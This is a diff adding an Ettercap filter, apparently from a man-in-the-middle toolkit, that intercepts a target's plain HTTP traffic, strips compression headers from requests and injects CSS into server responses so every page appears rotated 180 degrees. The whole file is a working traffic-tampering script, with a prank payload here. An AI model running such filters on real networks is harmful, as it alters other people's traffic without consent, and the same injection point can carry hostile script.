@@ -1,0 +1,75 @@
+############################################################################
+#                                                                          #
+#  HTTPS Request/Response Filter                                           #
+#  sourcecode from seannicholls github                                     #
+#  https://gist.github.com/seannicholls/5292296                            #
+#                                                                          #
+#  This program is free software; you can redistribute it and/or modify    #
+#  it under the terms of the GNU General Public License as published by    #
+#  the Free Software Foundation; either version 2 of the License, or       #
+#  (at your option) any later version.                                     #
+#                                                                          #
+############################################################################
+
+
+##
+#  Rotate the Internet using Ettercap and CSS3 Transforms.
+#  use rotate.eft ettercap filter to inject some CSS3 code
+#  into every HTML document so that its rotated 180 degrees.
+#  Credits: @seannicholls
+##
+
+
+
+
+##########################
+## Zap Content Encoding ##
+##########################
+# change target request to server
+if (ip.proto == TCP && tcp.dst == 80) {
+  msg("[morpheus] host:TaRONE   [ ⊶ ]");
+    if (search(DATA.data, "Accept-Encoding")) {  
+      replace("Accept-Encoding", "Accept-Rubbish!"); # note: replacement string is same length as original string
+      msg("[Morpheus] | info : Encoding zapped from response ✔");
+    }else{
+    if (search(DECODED.data, "Accept-Encoding")) {  
+      replace("Accept-Encoding", "Accept-Rubbish!"); # note: replacement string is same length as original string
+      msg("[Morpheus] | info : Encoding zapped from response ✔");
+    }
+    }
+}
+
+if (ip.proto == TCP && tcp.dst == 80) {
+  if (search(DATA.data, "gzip")) {  
+    replace("gzip", "  "); # note: four spaces In the replacement string
+    msg("[Morpheus] | info : gzip zapped from response ✔");
+   }  
+}
+
+if (ip.proto == TCP && tcp.dst == 80) {
+  if (search(DATA.data, "deflate")) {
+    replace("deflate", "       "); # note: seven spaces In the replacement string
+    msg("[Morpheus] | info : packet string deflate zapped ✔");
+  }
+}
+
+
+
+
+#####################
+## Replace Content ##
+#####################
+# change server response to target
+if (ip.dst == 'TaRONE' && ip.proto == TCP && tcp.src == 80) {
+  if (search(DATA.data, "<head>")) {
+    msg("[morpheus] | info : <head> tag found in target request!");
+    msg("[morpheus] | exec : injecting css3 code into <head> tag ✔");
+    msg("[morpheus] |_exec : rotating webpage document in 180 degrees ✔\n");
+
+      # inject our css code into packet captured head tag...
+      replace("<head>", "<head><style>body{-webkit-transform:rotate(-180deg) !important;-ms-transform:rotate(-180deg) !important;-moz-transform:rotate(-180deg) !important;}</style>");
+      replace("<HEAD>", "<HEAD><style>body{-webkit-transform:rotate(-180deg) !important;-ms-transform:rotate(-180deg) !important;-moz-transform:rotate(-180deg) !important;}</style>");
+  }
+}
+
+
